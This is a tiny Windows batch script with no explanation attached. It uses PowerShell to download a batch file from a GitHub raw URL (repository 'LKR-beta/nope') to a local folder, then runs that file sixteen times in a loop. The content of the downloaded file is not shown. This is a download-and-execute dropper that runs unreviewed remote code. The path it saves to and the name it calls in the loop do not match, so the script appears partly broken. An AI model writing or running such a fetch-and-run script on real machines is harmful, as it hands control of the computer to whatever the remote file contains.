@echo off
cls

powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/LKR-beta/nope/raw/main/LKR.bat','C:\your\asylum\LKR.bat')"

FOR /L %%i in (0, 10, 150) do LKR.bat

exit